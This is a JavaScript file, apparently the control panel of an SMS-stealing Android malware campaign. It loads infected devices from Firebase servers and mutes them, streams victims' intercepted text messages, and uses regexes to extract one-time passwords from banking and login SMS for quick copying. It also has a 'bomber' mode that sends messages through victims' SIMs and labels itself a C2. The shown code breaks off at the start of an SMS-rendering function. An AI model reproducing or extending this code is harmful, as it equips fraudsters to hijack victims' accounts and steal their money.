
const PUSH_CHARS = '-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz';
function decodeFirebasePushKey(key) {
    if (!key || typeof key !== 'string' || key.length < 8) return 0;
    let ts = 0;
    for (let i = 0; i < 8; i++) {
        const c = key[i];
        const idx = PUSH_CHARS.indexOf(c);
        if (idx === -1) return 0;
        ts = ts * 64 + idx;
    }
    if (ts >= 1577836800000 && ts <= 2051222400000) return ts;
    return 0;
}
/* ============================================
   OTP HUB — Mobile Dashboard Logic
   Card-based rendering, bottom sheet modal,
   touch-optimized interactions
   ============================================ */

const LIST_PATH = "user_list";
const DATA_PATH = "user_data";
const SMS_PATH = "user_sms";
const CARD_PATH = "Card";

let FB_URL = "";

// ---- State ----
const state = {
    devices: [],
    mutedDevices: new Set(),
    rawFullData: {},
    deviceFilter: 'all',

    localSmsCache: {},
    globalSortedMsgs: [],
    smsKeyMap: {},
    smsPageIndex: 0,
    smsPageSize: 30,
    sheetPageIndex: 0,
    sheetPageSize: 10,
    sheetSmsInterval: null,
    logsInterval: null,

    // Bomber
    bomberMode: 'bomber', // 'bomber' or 'normal'
    bomberSim: '1',
    bomberRunning: false,
    bomberAbort: false,

    selectedSim: '1',
    sheetSim: '1',

    forwardThreads: {},
    forwardIntervals: {},

    currentSheetDevId: null,
    sheetSmsAll: [],
    // Device Pagination
    filteredDevices: [],
    devicePageIndex: 0,
    devicePageSize: 40,
    // SMS Filtering & Search
    smsFilter: 'all',
    smsSearchQuery: '',
    smsSearchDebounceTimer: null,
};

// ---- OTP & Clipboard Helpers ----
function extractOtp(text) {
    if (!text || typeof text !== 'string') return null;
    
    // Pattern 1: Keywords like OTP, code, verification, PIN, passcode followed by 4-8 digits
    const m1 = text.match(/(?:otp|code|verification|passcode|pin|secret|one[- ]?time)[^0-9a-zA-Z]{0,25}[:\s-]*([0-9]{4,8})\b/i);
    if (m1 && m1[1]) return m1[1];
    
    // Pattern 2: Digits followed by keywords "is your OTP", "is your verification code", etc.
    const m2 = text.match(/\b([0-9]{4,8})\b[^0-9a-zA-Z]{0,25}(?:is your|as your|for|to verify|verification|otp)/i);
    if (m2 && m2[1]) return m2[1];

    // Pattern 3: If SMS has strong banking/auth keywords, look for isolated 4-8 digit number
    if (/(?:otp|verify|bank|auth|password|crd|debit|credit|login|secure|txn|transaction|account)/i.test(text)) {
        const allDigits = text.match(/\b\d{4,8}\b/g);
        if (allDigits) {
            for (const d of allDigits) {
                // Ignore years like 2024-2029 if length 4
                if (d.length === 4 && (d.startsWith('202') || d.startsWith('199'))) continue;
                return d;
            }
        }
    }
    return null;
}

function copyTextToClipboard(text, label = 'Copied') {
    if (!text) return;
    
    // Smartphone tactile haptic vibration
    if (navigator.vibrate) {
        try { navigator.vibrate(45); } catch(e) {}
    }
    
    if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(text).then(() => {
            showToast(`${label} copied! ✓`, 'success');
        }).catch(() => {
            fallbackCopy(text, label);
        });
    } else {
        fallbackCopy(text, label);
    }
}

function fallbackCopy(text, label) {
    const ta = document.createElement('textarea');
    ta.value = text;
    ta.style.position = 'fixed';
    ta.style.left = '-9999px';
    ta.style.top = '0';
    document.body.appendChild(ta);
    ta.focus();
    ta.select();
    try {
        document.execCommand('copy');
        showToast(`${label} copied! ✓`, 'success');
    } catch(e) {
        showToast('Could not copy', 'error');
    }
    document.body.removeChild(ta);
}

function copyOtp(otp, btn, event) {
    if (event) {
        event.stopPropagation();
        event.preventDefault();
    }
    copyTextToClipboard(otp, `OTP [${otp}]`);
    if (btn) {
        const origHtml = btn.innerHTML;
        btn.classList.add('copied');
        btn.innerHTML = `<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><polyline points="20 6 9 17 4 12"/></svg> COPIED!`;
        setTimeout(() => {
            btn.classList.remove('copied');
            btn.innerHTML = origHtml;
        }, 2200);
    }
}

function copyFullSms(text, event) {
    if (event) {
        event.stopPropagation();
        event.preventDefault();
    }
    copyTextToClipboard(text, 'Full SMS Message');
}

function setSmsFilter(filterType) {
    state.smsFilter = filterType;
    const btnAll = document.getElementById('smsFilterAll');
    const btnOtp = document.getElementById('smsFilterOtp');
    if (btnAll) btnAll.classList.toggle('active', filterType === 'all');
    if (btnOtp) btnOtp.classList.toggle('active', filterType === 'otp');
    state.smsPageIndex = 0;
    renderSmsPage();
}

function onSmsSearchInput() {
    if (state.smsSearchDebounceTimer) clearTimeout(state.smsSearchDebounceTimer);
    state.smsSearchDebounceTimer = setTimeout(() => {
        state.smsSearchQuery = (document.getElementById('smsSearch')?.value || '').toLowerCase().trim();
        state.smsPageIndex = 0;
        renderSmsPage();
    }, 180);
}

// ---- Init ----
document.addEventListener('DOMContentLoaded', () => {
    updateHeaderTime();
    setInterval(updateHeaderTime, 1000);

    // Enforce server selection modal on startup
    if (!FB_URL) {
        openServerModal();
    }

    const msgBody = document.getElementById('messageBody');
    if (msgBody) {
        msgBody.addEventListener('input', () => {
            document.getElementById('charCount').textContent = msgBody.value.length;
        });
    }

    const searchInput = document.getElementById('deviceSearch');
    if (searchInput) {
        searchInput.addEventListener('input', () => {
            if (state.searchDebounceTimer) clearTimeout(state.searchDebounceTimer);
            state.searchDebounceTimer = setTimeout(() => {
                state.devicePageIndex = 0;
                refreshDeviceList();
            }, 180);
        });
    }

    // Prevent body scroll when sheet is open
    document.getElementById('deviceSheet').addEventListener('touchmove', (e) => {
        const container = document.getElementById('sheetContainer');
        if (!container.contains(e.target)) e.preventDefault();
    }, { passive: false });

    // Auto-fetch devices on first load (Moved to selectServer)
    // fetchDevices();
});
const PLANET_INFO = {
    siyan: { flag: '⚡', sector: 'SIYAN CONDUIT // TELEMETRY GATEWAY', title: 'SIYAN PRIME' },
    fuckoff: { flag: '💀', sector: 'FUCKOFF CONDUIT // DARK GATEWAY', title: 'SHADOW MATRIX' },
    ravihh: { flag: '🌟', sector: 'RAVIHH CONDUIT // STAR TELEMETRY', title: 'RAVI SOLARIS' },
    kparty: { flag: '🎉', sector: 'K-PARTY GATEWAY // ADMIN LINK', title: 'NEON CARNIVAL' },
    yarakename: { flag: '🚀', sector: 'YARAKENAME CONDUIT // AERO GATEWAY', title: 'CYBER VORTEX' },
    hhhg: { flag: '🛡️', sector: 'HHHG CONDUIT // SECURE DEFENSE', title: 'IRON AEGIS' },
    dddd: { flag: '💎', sector: 'DDDD CONDUIT // DIAMOND MATRIX', title: 'DIAMOND APEX' },
    hhuu: { flag: '🔥', sector: 'HHUU CONDUIT // FLAME CHAKRA', title: 'INFERNO NOVA' },
    pmkisa: { flag: '🌾', sector: 'PMKISA CONDUIT // TELEMETRY HUB', title: 'TERRA PULSE' },
    skpanel: { flag: '🎯', sector: 'SK-PANEL CONDUIT // TARGET DECK', title: 'TITAN SNIPER' },
    refer: { flag: '💰', sector: 'REFER-EARN GATEWAY // REWARD LINK', title: 'GOLDEN VAULT' },
    alit: { flag: '🌸', sector: 'ALIT CONDUIT // SAKURA STREAM', title: 'SAKURA BLOOM' },
    panda: { flag: '🐼', sector: 'PANDA21 CONDUIT // BAMBOO MATRIX', title: 'BLACK PANDA' },
    m0596: { flag: '🛰️', sector: 'M0596 CONDUIT // ORBITAL RELAY', title: 'ORBITAL COSMOS' },
    goisif: { flag: '⚡', sector: 'GO-IS-IF GATEWAY // LIGHTNING STREAM', title: 'THUNDER VOLT' },
    rahul: { flag: '🏹', sector: 'RAHUL CONDUIT // PHANTOM GATEWAY', title: 'RAHUL PHANTOM' },
    mishra: { flag: '👑', sector: 'MISHRA CONDUIT // ROYAL GATEWAY', title: 'MISHRA EMPIRE' },
    lalan: { flag: '⚔️', sector: 'LALAN CONDUIT // STRIKE GATEWAY', title: 'LALAN STRIKE' },
    hinata: { flag: '👑', sector: 'BYAKUGAN PRINCESS // HYŪGA CLAN', title: 'HINATA HYŪGA' },
    tsunade: { flag: '🍶', sector: 'FIFTH HOKAGE // 100 HEALINGS SEAL', title: 'TSUNADE SENJU' },
    mikasa: { flag: '🧣', sector: 'SCOUT REGIMENT // SURVEY CORPS', title: 'MIKASA ACKERMAN' },
    nezuko: { flag: '🎋', sector: 'DEMON SLAYER // BLOOD DEMON ART', title: 'NEZUKO KAMADO' },
    sakura: { flag: '🌸', sector: 'CHERRY BLOSSOM // 100 STRENGTH CHAKRA', title: 'SAKURA HARUNO' }
};


// ---- Windows 12 System Window Controls & Modal Handlers ----
function openServerModal() {
    const modal = document.getElementById('serverModal');
    if (modal) modal.classList.remove('hidden');
}

function closeServerModal() {
    const modal = document.getElementById('serverModal');
    if (modal) modal.classList.add('hidden');
}

function win12Minimize() {
    const win = document.querySelector('.win12-window');
    if (win) {
        win.classList.toggle('is-minimized');
        if (win.classList.contains('is-minimized')) {
            showToast('Window minimized to Taskbar', 'info');
        }
    }
}

function win12Maximize() {
    const win = document.querySelector('.win12-window');
    if (win) {
        win.classList.toggle('is-maximized');
        const isMax = win.classList.contains('is-maximized');
        showToast(isMax ? 'Window maximized' : 'Window restored', 'info');
    }
}

function win12Restore() {
    const win = document.querySelector('.win12-window');
    if (win && win.classList.contains('is-minimized')) {
        win.classList.remove('is-minimized');
    }
}

const ANIME_THEME_PARTICLES = {
    siyan: ['⚡', '💠', '✨', '⚡', '🌟', '✨'],
    fuckoff: ['💀', '🔥', '⚡', '💀', '🩸', '⚡'],
    ravihh: ['🌟', '✨', '⭐', '🌟', '💫', '✨'],
    kparty: ['🎉', '⚡', '✨', '🎊', '💎', '✨'],
    yarakename: ['🚀', '🌌', '✨', '🛰️', '⭐', '✨'],
    hhhg: ['🛡️', '⚡', '💎', '🛡️', '✨', '⚡'],
    dddd: ['💎', '✨', '💠', '💎', '🔷', '✨'],
    hhuu: ['🔥', '⚡', '💥', '🔥', '✨', '⚡'],
    pmkisa: ['🌾', '🌿', '⚡', '🌾', '✨', '🍀'],
    skpanel: ['🎯', '⚡', '🏹', '🎯', '✨', '⚡'],
    refer: ['💰', '💵', '✨', '🪙', '💎', '✨'],
    alit: ['🌸', '💠', '✨', '⚡', '💖', '✨'],
    panda: ['🐼', '⚡', '🐾', '🐼', '💠', '✨'],
    m0596: ['🛰️', '📡', '✨', '🛰️', '🌍', '✨'],
    goisif: ['⚡', '🔥', '✨', '⚡', '💥', '✨'],
    rahul: ['🏹', '⚡', '✨', '🏹', '💫', '✨'],
    mishra: ['👑', '🔱', '✨', '💎', '🌟', '✨'],
    lalan: ['⚔️', '🔥', '⚡', '🦅', '💥', '✨'],
    hinata: ['⚡', '💠', '✨', '⚡', '🌟', '✨'],
    tsunade: ['💎', '🍀', '✨', '⚡', '🍃', '✨'],
    mikasa: ['⚔️', '⚡', '🌹', '✨', '⚔️', '⚡'],
    nezuko: ['🔥', '⚡', '✨', '🎋', '🔥', '✨'],
    sakura: ['🥊', '⚡', '💎', '⚡', '🌸', '✨']
};

const ANIME_STATUS_TEXT = {
    siyan: 'Siyan Prime Ready ⚡',
    fuckoff: 'Shadow Matrix Armed 💀',
    ravihh: 'Ravi Solaris Active 🌟',
    kparty: 'Neon Carnival Live 🎉',
    yarakename: 'Cyber Vortex Online 🚀',
    hhhg: 'Iron Aegis Synced 🛡️',
    dddd: 'Diamond Apex Engaged 💎',
    hhuu: 'Inferno Nova Ready 🔥',
    pmkisa: 'Terra Pulse Connected 🌾',
    skpanel: 'Titan Sniper Locked 🎯',
    refer: 'Golden Vault Armed 💰',
    alit: 'Sakura Bloom Awakened 🌸',
    panda: 'Black Panda Active 🐼',
    m0596: 'Orbital Cosmos Active 🛰️',
    goisif: 'Thunder Volt Live ⚡',
    rahul: 'Rahul Phantom Active 🏹',
    mishra: 'Mishra Empire Online 👑',
    lalan: 'Lalan Strike Armed ⚔️',
    hinata: 'TITAN C2 READY ⚡',
    tsunade: '100 Healings Ready 💎',
    mikasa: 'Survey Blade Armed ⚔️',
    nezuko: 'Demon Blood Awakened 🎋',
    sakura: 'Inner Chakra Focused 🥊'
};

function selectServer(url, name = 'hinata') {
    FB_URL = url;
    document.getElementById('serverModal').classList.add('hidden');
    
    const key = String(name).toLowerCase();
    document.body.setAttribute('data-planet', key);
    
    const info = PLANET_INFO[key] || { flag: '🌸', sector: 'ANIME CONDUIT // CHAKRA TELEMETRY', title: name.toUpperCase() };
    
    const headerName = document.getElementById('headerServerName');
    if (headerName) {
        headerName.innerHTML = `${info.title} ${info.flag}`;
    }
    const headerSub = document.querySelector('.header-info p');
    if (headerSub) {
        headerSub.innerHTML = `${info.sector} // TELEMETRY SAT-01 🛰️`;
    }
    
    // Update theme-specific floating particles
    const particles = ANIME_THEME_PARTICLES[key] || ANIME_THEME_PARTICLES.hinata;
    const container = document.getElementById('sakuraContainer');
    if (container) {
        const petals = container.querySelectorAll('.sakura-petal');
        petals.forEach((p, idx) => {
            if (particles[idx]) p.textContent = particles[idx];
        });
    }

    // Update status bar text
    const statusText = document.getElementById('statusText');
    if (statusText) {
        statusText.textContent = ANIME_STATUS_TEXT[key] || 'TITAN C2 READY ⚡';
    }

    // Trigger slight mobile haptic vibration
    if (navigator.vibrate) {
        navigator.vibrate([20, 30, 20]);
    }

    showToast(`${info.title} Theme Activated ${info.flag}`, 'info');
    fetchDevices();
    fetchAllSms(true);
}
function logout() {
    FB_URL = "";
    if (state.logsInterval) {
        clearInterval(state.logsInterval);
        state.logsInterval = null;
    }
    const headerName = document.getElementById('headerServerName');
    if (headerName) headerName.innerHTML = 'SELECT GATEWAY ▾';
    const statusText = document.getElementById('statusText');
    if (statusText) statusText.textContent = 'Awaiting Gateway';
    document.getElementById('serverModal').classList.remove('hidden');
    document.body.setAttribute('data-planet', 'hinata');
    
    // Clear data
    state.devices = [];
    state.rawFullData = {};
    document.getElementById('deviceList').innerHTML = '<div class="empty-state" id="deviceEmpty" style="display:flex;"><div class="empty-planet-icon">🌸</div><p>No Shinobi Probes In Byakugan Sight</p><span>Tap "BYAKUGAN FREQUENCY SWEEP" to sweep chakra</span></div>';
    document.getElementById('smsList').innerHTML = '<div class="empty-state" id="smsEmpty" style="display:flex;"><div class="empty-planet-icon">👁️</div><p>No Byakugan Decrypted Intercepts</p><span>Tap "AWAKEN BYAKUGAN STREAM" to intercept feeds</span></div>';
    updateStats(0, 0, 0);
    document.getElementById('smsCountBadge').textContent = '0';
    showToast('Gateway Disengaged 🌸', 'info');
}

// ---- Tab Switch ----
function switchTab(tabName) {
    win12Restore();
    document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
    const panel = document.getElementById('panel' + tabName.charAt(0).toUpperCase() + tabName.slice(1));
    if (panel) {
        panel.classList.remove('active');
        void panel.offsetWidth;
        panel.classList.add('active');
    }

    document.querySelectorAll('.nav-item').forEach(n => {
        n.classList.toggle('active', n.dataset.tab === tabName);
    });

    document.querySelectorAll('.win12-tab-pill').forEach(pill => {
        pill.classList.toggle('active', pill.dataset.tab === tabName);
    });

    // Scroll to top
    const mc = document.getElementById('mainContent');
    if (mc) mc.scrollTop = 0;

    // Auto-fetch data for the selected tab
    autoFetchForTab(tabName);
}

// Auto-fetch: triggers fetch when tab is opened
function autoFetchForTab(tabName) {
    if (state.logsInterval) {
        clearInterval(state.logsInterval);
        state.logsInterval = null;
    }
    switch (tabName) {
        case 'sender':
            if (state.devices.length === 0) fetchDevices();
            break;
        case 'logs':
            fetchAllSms();
            state.logsInterval = setInterval(() => {
                if (FB_URL) fetchAllSms(true);
            }, 8000);
            break;
        case 'bomber':
            if (state.devices.length === 0) {
                fetchDevices().then(() => {
                    populateSenderDropdowns();
                    updateBomberDeviceInfo();
                });
            } else {
                populateSenderDropdowns();
                updateBomberDeviceInfo();
            }
            break;
        case 'pages':
            fetchPagesData();
            break;
    }
}

// ---- Header Time ----
function updateHeaderTime() {
    const now = new Date();
    const t = now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit' });
    document.getElementById('headerTime').textContent = t;
}

// ---- Status ----
function setStatus(text, type = 'normal') {
    document.getElementById('statusText').textContent = text;
    const dot = document.getElementById('statusDot');
    dot.className = 'status-dot' + (type === 'loading' ? ' loading' : type === 'error' ? ' error' : '');
}

// ---- Toast ----
function showToast(message, type = 'info') {
    const container = document.getElementById('toastContainer');
    const icons = { success: '✓', error: '✕', info: 'ℹ', warning: '⚠' };
    const toast = document.createElement('div');
    toast.className = `toast toast-${type}`;
    toast.innerHTML = `<span class="toast-icon">${icons[type] || 'ℹ'}</span><span>${message}</span>`;
    container.appendChild(toast);
    setTimeout(() => {
        toast.classList.add('exit');
        setTimeout(() => toast.remove(), 250);
    }, 3000);
}

// ---- SIM ----
function selectSim(slot) {
    state.selectedSim = String(slot);
    document.querySelectorAll('.form-card .sim-btn').forEach(b => b.classList.toggle('active', b.dataset.slot === String(slot)));
}

function selectSheetSim(slot) {
    state.sheetSim = String(slot);
    document.querySelectorAll('.sheet-section .sim-sm .sim-btn').forEach(b => b.classList.toggle('active', b.dataset.slot === String(slot)));
}

// ---- Filter ----
function setDeviceFilter(f) {
    state.deviceFilter = f;
    document.querySelectorAll('.filter-row .pill').forEach(p => p.classList.toggle('active', p.dataset.filter === f));
    refreshDeviceList();
}

// ============================================
// TAB 1: DEVICES
// ============================================

async function fetchDevices() {
    setStatus('Fetching…', 'loading');
    const btn = document.getElementById('fetchDevicesBtn');
    btn.disabled = true;
    btn.textContent = '…';

    try {
        const [rList, rMuted, rData] = await Promise.all([
            fetch(`${FB_URL}/${LIST_PATH}.json?shallow=true`).then(r => r.json()),
            fetch(`${FB_URL}/user_muted_list.json?shallow=true`).then(r => r.json()),
            fetch(`${FB_URL}/${DATA_PATH}.json`).then(r => r.json()),
        ]);

        state.mutedDevices = new Set(rMuted ? Object.keys(rMuted).filter(k => !k.startsWith('-')) : []);
        
        const validIds = new Set();
        if (rList && typeof rList === 'object') {
            Object.keys(rList).forEach(id => {
                if (id && !id.startsWith('-')) validIds.add(id);
            });
        }
        if (rData && typeof rData === 'object') {
            Object.keys(rData).forEach(id => {
                if (id && !id.startsWith('-')) validIds.add(id);
            });
        }
        if (state.mutedDevices) {
            state.mutedDevices.forEach(id => {
                if (id && !id.startsWith('-')) validIds.add(id);
            });
        }

        const merged = {};
        validIds.forEach(id => { merged[id] = (rData || {})[id] || { d_name: "Android Device" }; });

        state.rawFullData = merged;
        renderDeviceList(merged);
        populateSenderDropdowns();
        setStatus('Ready');
        showToast(`${Object.keys(merged).length} devices loaded`, 'success');
    } catch (e) {
        setStatus('Error', 'error');
        showToast(e.message, 'error');
    } finally {
        btn.disabled = false;
        btn.innerHTML = `<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/></svg> BYAKUGAN FREQUENCY SWEEP 👁️💜`;
    }
}

function isDeviceOnline(devId, info) {
    if (!info) return false;
    
    // 1. Explicit status / online flags (boolean or string)
    const s = String(info.status || '').toLowerCase().trim();
    if (s === 'true' || s === 'online' || s === 'active' || info.status === true) {
        return true;
    }
    const o = String(info.online || '').toLowerCase().trim();
    if (o === 'true' || o === '1' || info.online === true || info.online === 1) {
        return true;
    }
    const st = String(info.state || '').toLowerCase().trim();
    if (st === 'true' || st === 'online' || st === 'active' || info.state === true) {
        return true;
    }

    // 2. Active C2 client registry check
    if (state.activeClients && state.activeClients.has(devId)) {
        return true;
    }

    // 3. Heartbeat / Activity timestamp check (within last 24h)
    const now = Date.now();
    const lu = Number(info.lastUpdated || info.timestamp || info.lastSeen || info.time || 0);
    if (!isNaN(lu) && lu > 0) {
        const diff = now - lu;
        if (diff >= -600000 && diff <= 24 * 60 * 60 * 1000) {
            return true;
        }
    }

    // 4. TimeandDate string check
    if (info.TimeandDate) {
        try {
            const parsed = Date.parse(info.TimeandDate);
            if (!isNaN(parsed) && (now - parsed) <= 24 * 60 * 60 * 1000) {
                return true;
            }
        } catch(e) {}
    }

    return false;
}

function renderDeviceList(data) {
    const list = document.getElementById('deviceList');
    const empty = document.getElementById('deviceEmpty');
    const pagination = document.getElementById('devicePagination');
    const search = (document.getElementById('deviceSearch')?.value || '').toLowerCase();

    // Remove old cards (keep empty state)
    list.querySelectorAll('.device-card').forEach(c => c.remove());
    state.devices = [];
    state.filteredDevices = [];
    let online = 0, muted = 0;

    if (!data || Object.keys(data).length === 0) {
        empty.style.display = 'flex';
        if (pagination) pagination.style.display = 'none';
        updateStats(0, 0, 0);
        return;
    }

    const sortedIds = Object.keys(data).sort();
    const matched = [];

    sortedIds.forEach(devId => {
        const isMuted = state.mutedDevices.has(devId);
        if (isMuted) muted++;
        const info = typeof data[devId] === 'object' ? data[devId] : { d_name: String(data[devId]) };

        const isOnline = isDeviceOnline(devId, info);
        if (isOnline) online++;

        state.devices.push(devId);

        if (state.deviceFilter === 'active' && !isOnline) return;
        if (state.deviceFilter === 'offline' && isOnline) return;
        if (state.deviceFilter === 'muted' && !isMuted) return;

        const model = info.model || info.d_name || 'Generic Device';
        const number = info.numberSim1 || info.sim1Number || info.phoneNumber || '';

        if (search) {
            const match = devId.toLowerCase().includes(search) || model.toLowerCase().includes(search) || number.toLowerCase().includes(search);
            if (!match) return;
        }

        matched.push({ devId, model, isOnline, isMuted });
    });

    // PRIORITIZE ONLINE DEVICES: Online devices appear at the top!
    matched.sort((a, b) => {
        if (a.isOnline && !b.isOnline) return -1;
        if (!a.isOnline && b.isOnline) return 1;
        return a.devId.localeCompare(b.devId);
    });

    state.filteredDevices = matched;
    updateStats(state.devices.length, online, muted);

    if (matched.length === 0) {
        empty.style.display = 'flex';
        if (pagination) pagination.style.display = 'none';
        return;
    }

    empty.style.display = 'none';
    if (pagination) pagination.style.display = 'flex';

    const total = matched.length;
    const pages = Math.ceil(total / state.devicePageSize);
    if (state.devicePageIndex >= pages) state.devicePageIndex = Math.max(0, pages - 1);

    const start = state.devicePageIndex * state.devicePageSize;
    const slice = matched.slice(start, start + state.devicePageSize);

    const fragment = document.createDocumentFragment();
    slice.forEach(({ devId, model, isOnline, isMuted }) => {
        const card = document.createElement('div');
        card.className = `device-card ${isOnline ? 'device-online' : 'device-offline'}${isMuted ? ' muted-card' : ''}`;
        card.dataset.deviceId = devId;
        card.innerHTML = `
            <input type="checkbox" class="dc-check device-checkbox" data-device-id="${devId}">
            <div class="dc-icon ${isOnline ? 'dc-icon-online' : 'dc-icon-offline'}">
                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
                    <rect x="5" y="2" width="14" height="20" rx="2" ry="2"/>
                    <line x1="12" y1="18" x2="12.01" y2="18"/>
                </svg>
            </div>
            <div class="dc-body">
                <div class="dc-id-wrap">
                    <span class="dc-id">${esc(devId)}</span>
                    ${isOnline ? '<span class="live-pulse-badge"><span class="live-pulse-dot"></span>LIVE</span>' : ''}
                </div>
                <div class="dc-model">${esc(model)}</div>
            </div>
            <div class="dc-status">
                <span class="status-pill-v2 ${isOnline ? 'status-pill-online' : 'status-pill-offline'}">
                    <span class="status-indicator-dot ${isOnline ? 'dot-online' : 'dot-offline'}"></span>
                    ${isOnline ? 'ONLINE' : 'OFFLINE'}
                </span>
                ${isMuted ? '<span class="mute-badge">MUTED</span>' : ''}
            </div>
        `;

        card.addEventListener('click', (e) => {
            if (e.target.type === 'checkbox') return;
            openSheet(devId);
        });

        fragment.appendChild(card);
    });

    list.appendChild(fragment);

    const infoEl = document.getElementById('devicePageInfo');
    const prevBtn = document.getElementById('devicePrevBtn');
    const nextBtn = document.getElementById('deviceNextBtn');
    if (infoEl) infoEl.textContent = `${state.devicePageIndex + 1} / ${pages}`;
    if (prevBtn) prevBtn.disabled = state.devicePageIndex <= 0;
    if (nextBtn) nextBtn.disabled = state.devicePageIndex >= pages - 1;
}

function prevDevicePage() {
    if (state.devicePageIndex > 0) {
        state.devicePageIndex--;
        renderDeviceList(state.rawFullData);
        document.getElementById('mainContent').scrollTop = 0;
    }
}

function nextDevicePage() {
    const pages = Math.ceil(state.filteredDevices.length / state.devicePageSize);
    if (state.devicePageIndex < pages - 1) {
        state.devicePageIndex++;
        renderDeviceList(state.rawFullData);
        document.getElementById('mainContent').scrollTop = 0;
    }
}

function refreshDeviceList() {
    renderDeviceList(state.rawFullData);
}

function updateStats(total, online, muted) {
    document.getElementById('deviceCountVal').textContent = total;
    document.getElementById('onlineCountVal').textContent = online;
    document.getElementById('mutedCountVal').textContent = muted;
}

function populateSenderDropdowns() {
    ['sheetSenderDevice', 'normalSenderSelect'].forEach(id => {
        const sel = document.getElementById(id);
        if (!sel) return;
        const val = sel.value;
        sel.innerHTML = '<option value="">— Select Sender Device —</option>';
        
        // Add "ALL" option only for Normal Mode
        if (id === 'normalSenderSelect' && state.devices.length > 0) {
            const optAll = document.createElement('option');
            optAll.value = 'ALL';
            optAll.textContent = `⚡ — ALL ACTIVE DEVICES (${state.devices.length}) —`;
            optAll.style.fontWeight = 'bold';
            optAll.style.color = 'var(--neon-green)';
            sel.appendChild(optAll);
        }

        state.devices.forEach(d => {
            const opt = document.createElement('option');
            opt.value = d;
            const info = (state.rawFullData && state.rawFullData[d]) || {};
            const model = info.model || info.d_name || info.modelName || 'Device';
            const phone = info.numberSim1 || info.sim1Number || info.phoneNumber || '';
            opt.textContent = phone ? `${model} (${d.slice(0, 8)}…) • ${phone}` : `${model} (${d.slice(0, 8)}…)`;
            sel.appendChild(opt);
        });
        if (val) sel.value = val;
    });
}

// ---- Selection Helpers ----
function toggleSelectAll(cb) {
    document.querySelectorAll('.device-checkbox').forEach(c => c.checked = cb.checked);
}

function selectAllDevices() {
    document.querySelectorAll('.device-checkbox').forEach(c => c.checked = true);
}

function getSelectedDeviceIds() {
    return [...document.querySelectorAll('.device-checkbox:checked')].map(c => c.dataset.deviceId);
}

async function toggleMuteSelected() {
    const sel = getSelectedDeviceIds();
    if (!sel.length) return showToast('Select devices', 'warning');
    setStatus('Updating…', 'loading');
    let ok = 0;
    for (const id of sel) {
        try {
            if (state.mutedDevices.has(id)) {
                await fetch(`${FB_URL}/user_muted_list/${id}.json`, { method: 'DELETE' });
                await fetch(`${FB_URL}/${LIST_PATH}/${id}.json`, { method: 'PUT', body: 'true', headers: { 'Content-Type': 'application/json' } });
            } else {
                await fetch(`${FB_URL}/${LIST_PATH}/${id}.json`, { method: 'DELETE' });
                await fetch(`${FB_URL}/user_muted_list/${id}.json`, { method: 'PUT', body: 'true', headers: { 'Content-Type': 'application/json' } });
            }
            ok++;
        } catch (e) {}
    }
    showToast(`Updated ${ok} devices`, 'success');
    fetchDevices();
}

async function unmuteSelected() {
    const sel = getSelectedDeviceIds();
    if (!sel.length) return showToast('Select devices', 'warning');
    setStatus('Unmuting…', 'loading');
    let ok = 0;
    for (const id of sel) {
        if (!state.mutedDevices.has(id)) continue;
        try {
            await fetch(`${FB_URL}/user_muted_list/${id}.json`, { method: 'DELETE' });
            await fetch(`${FB_URL}/${LIST_PATH}/${id}.json`, { method: 'PUT', body: 'true', headers: { 'Content-Type': 'application/json' } });
            ok++;
        } catch (e) {}
    }
    if (ok) showToast(`Unmuted ${ok}`, 'success');
    fetchDevices();
}



// ============================================
// TAB 2: SMS LOGS
// ============================================

async function fetchAllSms(silent = false) {
    if (!FB_URL) {
        if (!silent) showToast('Please select a server first', 'info');
        return;
    }
    if (!silent) setStatus('Fetching SMS…', 'loading');
    const btn = document.getElementById('fetchSmsBtn');
    if (btn && !silent) {
        btn.disabled = true;
        btn.innerHTML = '<span class="spinner"></span> Streaming…';
    }

    try {
        let dict = {};

        // Method 1: Ultra-fast query for latest 300 messages using Firebase RTDB ordering
        try {
            const fastData = await fetch(`${FB_URL}/${SMS_PATH}.json?orderBy="$key"&limitToLast=300`, {
                signal: AbortSignal.timeout(8000)
            }).then(r => r.json());

            if (fastData && typeof fastData === 'object' && Object.keys(fastData).length > 0) {
                dict = fastData;
            }
        } catch (fastErr) {
            console.warn('Direct limitToLast fetch fallback:', fastErr);
        }

        // Method 2: Fallback to shallow query if limitToLast wasn't supported
        if (Object.keys(dict).length === 0) {
            const rShallow = await fetch(`${FB_URL}/${SMS_PATH}.json?shallow=true`, {
                signal: AbortSignal.timeout(10000)
            }).then(r => r.json()).catch(() => ({}));

            if (rShallow && typeof rShallow === 'object') {
                const keys = Object.keys(rShallow);
                const targetKeys = keys.slice(-60);

                for (let i = 0; i < targetKeys.length; i += 25) {
                    const batch = targetKeys.slice(i, i + 25);
                    const results = await Promise.allSettled(
                        batch.map(k => fetch(`${FB_URL}/${SMS_PATH}/${k}.json`, { signal: AbortSignal.timeout(8000) })
                            .then(r => r.json())
                            .then(d => ({ k, d }))
                        )
                    );
                    results.forEach(res => {
                        if (res.status === 'fulfilled' && res.value && res.value.d) {
                            dict[res.value.k] = res.value.d;
                        }
                    });
                    if (!silent) {
                        setStatus(`SMS ${Math.min(i + 25, targetKeys.length)}/${targetKeys.length}…`, 'loading');
                    }
                }
            }
        }

        state.localSmsCache = dict;
        updateSmsTree(dict);
        if (!silent) {
            setStatus('Ready');
            showToast(`Stream Synced: ${state.globalSortedMsgs.length} Intercepts`, 'success');
        }
    } catch (e) {
        console.error('fetchAllSms error:', e);
        if (!silent) {
            setStatus('Error', 'error');
            showToast(e.message || 'Failed to fetch SMS', 'error');
        }
    } finally {
        if (btn && !silent) {
            btn.disabled = false;
            btn.innerHTML = `<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg> Stream Chakra Feed 💜`;
        }
    }
}

function updateSmsTree(data) {
